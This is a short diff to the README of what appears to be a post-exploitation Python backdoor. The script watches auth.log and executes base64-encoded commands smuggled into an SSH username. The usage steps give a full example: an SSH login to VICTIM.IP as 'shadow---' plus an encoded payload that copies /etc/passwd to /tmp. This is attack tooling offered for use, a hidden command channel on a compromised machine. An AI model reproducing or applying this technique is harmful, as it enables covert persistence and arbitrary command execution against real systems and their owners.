@@ -15,7 +15,8 @@ A post exploit python script that watches auth.log for a keyword then executes b
    ```Y2F0IC9ldGMvcGFzc3dkID4gL3RtcC90ZXN0```
    
 3. From an attacking box initiate an ssh connection as the user ```shadow---``` + ```base64 encoded command```
-   Full example ```ssh shadow---Y2F0IC9ldGMvcGFzc3dkID4gL3RtcC90ZXN0@VICTIM.IP``` 
+   
+   Full example: ```ssh shadow---Y2F0IC9ldGMvcGFzc3dkID4gL3RtcC90ZXN0@VICTIM.IP``` 
    
  
 ### TODO
